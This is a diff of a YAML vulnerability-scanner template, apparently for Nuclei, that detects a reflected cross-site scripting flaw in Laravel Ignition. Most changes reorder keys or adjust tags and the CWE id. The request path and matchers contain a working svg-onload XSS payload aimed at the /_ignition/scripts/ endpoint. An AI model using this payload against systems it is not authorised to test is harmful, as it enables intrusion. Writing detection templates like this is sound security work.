@@ -1,5 +1,4 @@
 id: laravel-ignition-xss
-
 info:
   name: Laravel Ignition - Cross-Site Scripting
   author: 0x_Akoko
@@ -14,29 +13,24 @@ info:
   classification:
     cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N
     cvss-score: 7.2
-    cwe-id: CWE-79
+    cwe-id: CWE-79,CWE-83
   metadata:
     max-request: 1
-  tags: laravel,xss,ignition,vuln
-
+  tags: ignition,laravel,vuln,xss
 http:
-  - method: GET
-    path:
-      - "{{BaseURL}}/_ignition/scripts/--><svg%20onload=alert(document.domain)>"
-
-    matchers-condition: and
-    matchers:
-      - type: word
-        part: body
+  - matchers:
+      - part: body
+        type: word
         words:
-          - "Undefined index: --><svg onload=alert(document.domain)> in file"
-
-      - type: word
-        part: header
+          - 'Undefined index: --><svg onload=alert(document.domain)> in file'
+      - part: header
+        type: word
         words:
-          - "text/html"
-
-      - type: status
-        status:
+          - text/html
+      - status:
           - 500
-
+        type: status
+    matchers-condition: and
+    method: GET
+    path:
+      - '{{BaseURL}}/_ignition/scripts/--><svg%20onload=alert(document.domain)>'
